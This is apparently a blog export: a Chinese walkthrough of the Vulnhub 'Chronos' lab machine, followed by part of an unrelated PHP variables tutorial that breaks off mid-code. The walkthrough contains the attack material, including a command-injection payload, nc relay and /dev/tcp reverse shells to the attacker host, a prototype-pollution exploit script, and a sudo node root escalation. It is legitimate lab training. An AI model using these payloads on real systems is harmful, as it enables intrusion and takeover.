    <title>3. Vulnhub Chronos Writeup</title>
    <url>/2022/04/01/3.%20Vulnhub%20Chronos%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度简单。</p>
<span id="more"></span>
<h1 id="靶机信息">靶机信息</h1>
<p>靶机地址：https://www.vulnhub.com/entry/chronos-1,735/</p>
<p>难度：Easy</p>
<p>虚拟机软件：Virtual Box</p>
<p>目标：取得2个flag，获得root权限</p>
<p>涉及的攻击方法：</p>
<ul>
<li>端口扫描</li>
<li>web侦察</li>
<li>命令注入</li>
<li>数据编、解码</li>
<li><strong>搜索大法</strong></li>
<li><strong>框架漏洞利用</strong></li>
<li>代码审计</li>
<li>NC串联</li>
<li>本地提权</li>
</ul>
<h1 id="渗透">渗透</h1>
<p>攻击主机 kali：<code>192.168.137.104</code></p>
<h2 id="主机发现">主机发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netdiscover -r 192.168.137.0/16 </span><br><span class="line"></span><br><span class="line">如果实际的子网掩码是24位，那么上面查询的时候就减8，也就是16。实际查询的子网掩码位数设置为实际的子网掩码位数减8效果最好。</span><br></pre></td></tr></table></figure>
<p>原理：与前面的两者相同，都是通过ARP解析</p>
<p>结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113217.png" /></p>
<p>因此，靶机的IP为 192.168.137.105</p>
<h2 id="端口扫描">端口扫描</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p1-65535 192.168.137.103</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113352.png" /></p>
<h2 id="端口服务发现">端口服务发现</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 192.168.137.105</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401113546.png" /></p>
<p>信息：</p>
<ol type="1">
<li>22端口上的服务为openssh</li>
<li>80端口上的服务为http，版本为 2.4.29</li>
<li>8000端口上的服务也是http，但是用的
<code>node.js express framework</code></li>
<li>系统为Ubuntu</li>
</ol>
<h2 id="访问http服务">访问http服务</h2>
<p>有三件事必须做：</p>
<ol type="1">
<li>抓包</li>
<li>看源码</li>
<li>扫目录</li>
</ol>
<p>发现80端口和8000端口很类似（一个朴素，一个华丽），源码是一样的，其中有一串特殊的字符：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _0x5bdf=[&#x27;150447srWefj&#x27;,&#x27;70lwLrol&#x27;,&#x27;1658165LmcNig&#x27;,&#x27;open&#x27;,&#x27;1260881JUqdKM&#x27;,&#x27;10737CrnEEe&#x27;,&#x27;2SjTdWC&#x27;,&#x27;readyState&#x27;,&#x27;responseText&#x27;,&#x27;1278676qXleJg&#x27;,&#x27;797116soVTES&#x27;,&#x27;onreadystatechange&#x27;,&#x27;http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL&#x27;,&#x27;User-Agent&#x27;,&#x27;status&#x27;,&#x27;1DYOODT&#x27;,&#x27;400909Mbbcfr&#x27;,&#x27;Chronos&#x27;,&#x27;2QRBPWS&#x27;,&#x27;getElementById&#x27;,&#x27;innerHTML&#x27;,&#x27;date&#x27;];(function(_0x506b95,_0x817e36)&#123;var _0x244260=_0x432d;while(!![])&#123;try&#123;var _0x35824b=-parseInt(_0x244260(0x7e))*parseInt(_0x244260(0x90))+parseInt(_0x244260(0x8e))+parseInt(_0x244260(0x7f))*parseInt(_0x244260(0x83))+-parseInt(_0x244260(0x87))+-parseInt(_0x244260(0x82))*parseInt(_0x244260(0x8d))+-parseInt(_0x244260(0x88))+parseInt(_0x244260(0x80))*parseInt(_0x244260(0x84));if(_0x35824b===_0x817e36)break;else _0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;catch(_0x3fb1dc)&#123;_0x506b95[&#x27;push&#x27;](_0x506b95[&#x27;shift&#x27;]());&#125;&#125;&#125;(_0x5bdf,0xcaf1e));function _0x432d(_0x16bd66,_0x33ffa9)&#123;return _0x432d=function(_0x5bdf82,_0x432dc8)&#123;_0x5bdf82=_0x5bdf82-0x7e;var _0x4da6e8=_0x5bdf[_0x5bdf82];return _0x4da6e8;&#125;,_0x432d(_0x16bd66,_0x33ffa9);&#125;function loadDoc()&#123;var _0x17df92=_0x432d,_0x1cff55=_0x17df92(0x8f),_0x2beb35=new XMLHttpRequest();_0x2beb35[_0x17df92(0x89)]=function()&#123;var _0x146f5d=_0x17df92;this[_0x146f5d(0x85)]==0x4&amp;&amp;this[_0x146f5d(0x8c)]==0xc8&amp;&amp;(document[_0x146f5d(0x91)](_0x146f5d(0x93))[_0x146f5d(0x92)]=this[_0x146f5d(0x86)]);&#125;,_0x2beb35[_0x17df92(0x81)](&#x27;GET&#x27;,_0x17df92(0x8a),!![]),_0x2beb35[&#x27;setRequestHeader&#x27;](_0x17df92(0x8b),_0x1cff55),_0x2beb35[&#x27;send&#x27;]();&#125;</span><br></pre></td></tr></table></figure></p>
<p>乍一看，好像是加密的js代码。这里推荐一个网址，可以对代码进行美化和编码解码：https://gchq.github.io/CyberChef/</p>
<p>利用<code>javascript beautify</code>模块美化之后虽然看的很清楚了，但是因为各种参数都加密了还是无法直到这段代码的意思。但是其中有一串字符没有加密：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure></p>
<p>最后，抓包看一下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401114650.png" /></p>
<p>发现确实有数据包往 chronos.local:8000
地方发送，但是我们无法用浏览器直接访问，因为kali并不知道chronos.local是哪台主机，但是我们知道，这应该就是靶机。因此，修改<code>/etc/hosts</code>，添加一条记录：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120624.png" /></p>
<p>然后可以访问了，并且页面发生了变化。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401120700.png" /></p>
<p>结合url分析，发现url中的那一串字符像是警告base64编码的，因此，再次利用刚刚的网址进行解码。利用
<code>magic</code>
模块进行解码，发现是base58编码。得到解码后的结果：<code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></p>
<blockquote>
<p>base系列有许多，但是常见的是base64和base32。还有许多不常见的，比如这里的base58。</p>
</blockquote>
<ol type="1">
<li>date</li>
<li><code>'+Today is %A, %B %d, %Y %H:%M:%S.'</code></li>
<li>页面上显示的时间信息</li>
</ol>
<p>这让我想到Linux中的date命令，也是能够显示时间，因此在kali上尝试一下如下代码：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">date &#x27;+Today is %A, %B %d, %Y %H:%M:%S.&#x27;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401121236.png" /></p>
<p>发现结果和页面显示的一模一样（未经过渲染）。因此，有理由怀疑后台服务调用了系统命令，并且后台代码可能如下（猜测，并不是真正的代码，只是说明代码逻辑）：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd = &#x27;date&#x27; .$format;</span><br><span class="line">system(cmd);</span><br></pre></td></tr></table></figure></p>
<p>如果我们什么都不修改，那么执行的命令就是<code>date '+Today is %A, %B %d, %Y %H:%M:%S.'</code>，因此，我们可以考虑到Linux中以下执行多条命令（上周使用的是管道符，这周使用
<code>$$</code>，该符号只有在前面的命令正确执行的情况下，才会执行后面的命令）</p>
<p>先做一个尝试， <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;ls -&gt; yZSGA</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401134641.png" /></p>
<p>成功执行，因此这里确实调用了系统命令。接下来使用nc串联来反弹shell（先判断是否有nc，然后再判断是否有
-e）</p>
<h2 id="反弹shell">反弹shell</h2>
<p>首先在kali上启动两个监听端口： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 3333</span><br><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></p>
<p>然后将payload base58编码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;&amp;nc 192.168.137.104 3333|/bin/bash|nc 192.168.137.104 4444</span><br><span class="line">2XqeYgBDNepmM9vgTVeLGrep4fZHdsG5tAFHFFoH1pgfmPx59cE4Pphh2FNWaHBapy5Tin3Vs6E4MYXhu</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135228.png" /></p>
<p>虽然提示出错，但是kali已经成功连接上了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401135325.png" /></p>
<p>接下来进行信息收集：</p>
<p>发现在 <code>/home/imera</code>
目录下有一个<code>user.txt</code>文件，但是却没有权限读取，这应该就是其中一个flag了。并且在<code>/root</code>目录下也有一个flag，这应该是第二个flag，不出意料也没有权限读取。</p>
<p>还可以看一下 <code>app.js</code> <code>package.jsom</code> 和
<code>package-lock.json</code> 的内容，其中第一个的源码如下：
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// created by alienum for Penetration Testing</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123;exec&#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bs58 = <span class="built_in">require</span>(<span class="string">&#x27;bs58&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8000</span>;</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&#x27;cors&#x27;</span>);</span><br><span class="line">app.use(cors());</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.sendFile(<span class="string">&#x27;/var/www/html/index.html&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">app.get(<span class="string">&#x27;/date&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> agent = req.headers[<span class="string">&#x27;user-agent&#x27;</span>];</span><br><span class="line">	<span class="keyword">var</span> cmd = <span class="string">&#x27;date &#x27;</span>;</span><br><span class="line">	<span class="keyword">const</span> format = req.query.format;</span><br><span class="line">	<span class="keyword">const</span> bytes = bs58.decode(format);</span><br><span class="line">	<span class="keyword">var</span> decoded = bytes.toString();</span><br><span class="line">	<span class="keyword">var</span> concat = cmd.concat(decoded);</span><br><span class="line">	<span class="keyword">if</span> (agent === <span class="string">&#x27;Chronos&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (concat.includes(<span class="string">&#x27;id&#x27;</span>) || concat.includes(<span class="string">&#x27;whoami&#x27;</span>) || concat.includes(<span class="string">&#x27;python&#x27;</span>) || concat.includes(<span class="string">&#x27;nc&#x27;</span>) || concat.includes(<span class="string">&#x27;bash&#x27;</span>) || concat.includes(<span class="string">&#x27;php&#x27;</span>) || concat.includes(<span class="string">&#x27;which&#x27;</span>) || concat.includes(<span class="string">&#x27;socat&#x27;</span>)) &#123;</span><br><span class="line">			res.send(<span class="string">&#x27;Something went wrong&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		exec(concat, <span class="function">(<span class="params">error, stdout, stderr</span>) =&gt;</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (error) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`error: <span class="subst">$&#123; error.message &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (stderr) &#123;</span><br><span class="line">				<span class="built_in">console</span>.log(<span class="string">`stderr: <span class="subst">$&#123; stderr &#125;</span>`</span>);</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			res.send(stdout);</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res.send(<span class="string">&#x27;Permission Denied&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">`Server running at <span class="subst">$&#123; port &#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>上述代码中就可以验证确实是执行了系统命令，并且还记得之前弹出的“something
went
wrong”吗？这是因为这里做了过滤，但是仅仅只是判断了以下，并没有阻止命令执行。这就叫百密一疏吧。</p>
<p>还有一个目录
<code>/opt/chronos-v2</code>，里面有一个<code>backend</code>的目录，这一看就是与后台有关。里面有一个<code>server.js</code>，代码如下：
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fileupload = <span class="built_in">require</span>(<span class="string">&#x27;express-fileupload&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(fileupload(&#123; <span class="attr">parseNested</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.set(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.set(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;/opt/chronos-v2/frontend/pages&#x27;</span>);</span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">	res.render(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">const</span> server = http.Server(app);</span><br><span class="line"><span class="keyword">const</span> addr = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">8080</span>;</span><br><span class="line">server.listen(port, addr, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&#x27;Server listening on &#x27;</span> + addr + <span class="string">&#x27; port &#x27;</span> + port);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<p>从这里能看出有一个8080端口，但是只能通过127.0.0.1才能访问，这也是为什么端口扫面无法得到这个端口。</p>
<p>信息收集差不多，那么接下来就是要提权了。</p>
<h2 id="权限提升-本地提权">权限提升-本地提权</h2>
<p>Linux提权常用的三种方式：</p>
<ol type="1">
<li>内核漏洞</li>
<li>suid提权</li>
<li>sudo配置不当提权</li>
</ol>
<p>这里经过测试发现前两者都不行。因此得另想办法，忽然想到之前信息收集得到了一个技术
node.js。查看了<code>/chronos-v2/backend/package.json</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401142659.png" /></p>
<p>这里的是否存在文件上传的漏洞？因此去搜一下，发现虽然不存在文件上传漏洞，但是存在node.js的原型链污染，可以使用这个漏洞进行提权。</p>
<p>博客地址如下：https://blog.p6.is/Real-World-JS-1/</p>
<p>还提供了exp： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/192.168.137.104/5555 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pollute</span></span><br><span class="line">requests.post(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>, files = &#123;<span class="string">&#x27;__proto__.outputFunctionName&#x27;</span>: (</span><br><span class="line">    <span class="literal">None</span>, <span class="string">f&quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;);x&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute command</span></span><br><span class="line">requests.get(<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>（第一个ip为靶机IP，后面两个的端口为node.js所在端口，也就是8080，从刚刚的信息收集中知道）</p>
<p>在kali上编写上面的程序，然后开启http服务，让靶机下载这个文件。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: python -m SimpleHTTPServer 80</span><br><span class="line">靶机: </span><br><span class="line">cd /tmp</span><br><span class="line">wget http://192.168.137.104/exp.py</span><br></pre></td></tr></table></figure></p>
<p>然后kali监听8888端口，靶机执行该程序 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali: nc -lvnp 8888</span><br><span class="line">靶机: </span><br><span class="line">	chmod +x exp.py</span><br><span class="line">	python3 exp.py</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145431.png" /></p>
<p>获得 imera 权限，虽然不是root，但是也足够读取其中一个flag了。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/home/imera/user.txt: </span><br><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure></p>
<p>接下来还需要提权，得到root权限。这里介绍常用的Linux提权的第三种，sudo配置提权。</p>
<p>查看sudo配置： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401145800.png" /></p>
<p>注意到用户imera拥有两个程序
npm和node的全部权限，还不需要密码，因此可以在这里提权。</p>
<p>参考文章：https://gtfobins.github.io/gtfobins/node/</p>
<p>执行以下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150130.png" /></p>
<p>提权成功。</p>
<p>获取第二个flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/root/root.txt: </span><br><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure></p>
<p>至此，渗透过程结束。</p>
<h1 id="彩蛋部分">彩蛋部分</h1>
<p>将两个flag解码（base64），然后再放到谷歌去翻译，得到如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220401150635.png" /></p>
<h1 id="总结">总结</h1>
<p>通过对这个靶机的渗透，有以下几点感受：</p>
<ol type="1">
<li>如同第一次权限提升的时候，经常会遇到我们不熟悉的技术，这时候就需要大量的搜索，快速学习！</li>
<li>学习了第三种Linux提权的方式</li>
<li>node.js的express-fileupload 1.1.7 存在原型链污染漏洞</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>node.js原型链污染</tag>
        <tag>nc串联</tag>
      </tags>
  </entry>
  <entry>
    <title>3. 变量与常量</title>
    <url>/2022/11/17/3.%20%E5%8F%98%E9%87%8F%E4%B8%8E%E5%B8%B8%E9%87%8F/</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="变量的创建">1. 变量的创建</h1>
<p>PHP 变量命名遵守以下 3 条规则：</p>
<ol type="1">
<li>以 <code>$</code> 字符开头，<strong>紧跟的是</strong>
字母和下划线；</li>
<li>后面可能是字母、下划线或数字，不能有特殊字符；</li>
<li>区分大小写</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_name</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116092429.png" /></p>
<h1 id="变量的初始化">2. 变量的初始化</h1>
<p>创建变量的时候，如果没有对变量进行初始化，则会使用默认值：</p>
<table>
<thead>
<tr class="header">
<th>类型</th>
<th>默认值</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>boolean</td>
<td>false</td>
</tr>
<tr class="even">
<td>integer</td>
<td>0</td>
</tr>
<tr class="odd">
<td>string</td>
<td>空字符串</td>
</tr>
<tr class="even">
<td>array</td>
<td>空数组</td>
</tr>
</tbody>
</table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="variable">$var</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$var</span> + <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$var</span>.<span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$var</span> ? <span class="string">&#x27;true&#x27;</span>: <span class="string">&#x27;false&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">var_dump(count(<span class="variable">$var</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116095339.png" /></p>
<p>解释：</p>
<ol type="1">
<li>如果直接 <code>var_dump($var)</code>，此时的 <code>$var</code>
还没有定义，所以返回 <code>NULL</code>；</li>
<li>如果 <code>var_dump($var + 10)</code>，<code>$var</code> 会先转为
integer，然后再进行相加，最终结果是 10，也能说明 <code>$var</code>
如果是 integer，则默认值为 0；</li>
<li><code>var_dump($var.'php')</code>。<code>$var</code>
会先转为字符型，然后再进行拼接，最后的结果还是
<code>php</code>，这就说名，<code>$var</code>
作为字符型，默认值是空字符串；</li>
<li><code>var_dump($var ? 'true': 'false'</code>，这是一个三元表达式，如果
<code>$var</code>
为真，则返回冒号前面的，否则返回冒号后面的，这里的结果是
<code>false</code>，也就是 <code>$var</code> 作为布尔类型的默认值是
false；</li>
<li><code>var_dump(count($var))</code>，<code>count</code>
用来计算数组的长度，这里没有返回值，也就说明 <code>$var</code>
作为数组，默认是没有长度的，也就是空数组；</li>
</ol>
<blockquote>
<p>虽然变量具有默认值，但在声明的时候一定要初始化!!!</p>
</blockquote>
<h1 id="变量的赋值">3. 变量的赋值</h1>
<p>变量的赋值只有两种方式：</p>
<ol type="1">
<li>值传递，<code>$var2 = $var1</code>；</li>
<li>引用传递赋值，<code>$var3 = &amp;$var1</code>，在变量前面加上
<code>&amp;</code> 符号；</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;值传递：&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$var1</span> = <span class="string">&#x27;php&#x27;</span>;</span><br><span class="line"><span class="variable">$var2</span> = <span class="variable">$var1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$var1 = &#x27;</span>.<span class="variable">$var1</span>.<span class="string">&#x27;, $var2 = &#x27;</span>.<span class="variable">$var2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;修改 $var2&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$var2</span> = <span class="string">&#x27;html&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$var1 = &#x27;</span>.<span class="variable">$var1</span>.<span class="string">&#x27;, $var2 = &#x27;</span>.<span class="variable">$var2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;引用传递：&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$var3</span> = &amp;<span class="variable">$var1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$var1 = &#x27;</span>.<span class="variable">$var1</span>.<span class="string">&#x27;, $var3 = &#x27;</span>.<span class="variable">$var3</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;修改 $var3&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$var3</span> = <span class="string">&#x27;html&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$var1 = &#x27;</span>.<span class="variable">$var1</span>.<span class="string">&#x27;, $var3 = &#x27;</span>.<span class="variable">$var3</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116101516.png" /></p>
<p>可以观察到：</p>
<ol type="1">
<li>值传递方式中，修改了 <code>$var2</code>，也不影响
<code>$var1</code>，这说明这两个变量是独立的，只是值相等；</li>
<li>而引用传递中，修改了 <code>$var3</code>，<code>$var1</code>
也跟着修改，这说明其实是同一个变量，只是有两个不同的名字罢了；</li>
</ol>
<h1 id="可变变量">4. 可变变量</h1>
<p>PHP 中的可变变量：</p>
<ul>
<li><p>新变量的 <strong>名称</strong> 来自另一个变量的
<strong>值</strong>；</p>
<p>又是一个坑。</p></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"><span class="variable">$$name</span> = <span class="string">&#x27;girl&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$takagi</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116102222.png" /></p>
<p>可以看到，变量 <code>$name</code> 的值是 <code>takagi</code>，而
<code>$$name = 'girl'</code> 等价于 <code>$takagi = 'girl'</code>。</p>
<p>可变变量的使用是有条件的，那就是变量的值要满足 [[#1.
变量的创建]]中的命名规则才可以。</p>
<h1 id="变量的作用域">5. 变量的作用域</h1>
<table>
<colgroup>
<col style="width: 18%" />
<col style="width: 48%" />
<col style="width: 33%" />
</colgroup>
<thead>
<tr class="header">
<th><strong>变量类型</strong></th>
<th><strong>创建</strong></th>
<th><strong>作用域</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>局部变量</td>
<td>当前脚本的函数内创建</td>
<td>仅当前函数内部</td>
</tr>
<tr class="even">
<td>全局变量</td>
<td>当前脚本的函数外部定义</td>
<td>当前脚本，不能在函数内部<em>直接使用</em>，需要声明</td>
</tr>
<tr class="odd">
<td>超全局变量（预定义变量）</td>
<td>系统预定义，无须创建，跨脚本使用</td>
<td>跨脚本，任何地方都能用</td>
</tr>
<tr class="even">
<td>静态变量</td>
<td>函数内部用 <code>static</code> 创建</td>
<td>可供每次调用时共享</td>
</tr>
</tbody>
</table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;  <span class="comment"># 全局变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="string">&#x27;hello&#x27;</span>;  <span class="comment"># 局部变量</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> get_name();</span><br><span class="line"><span 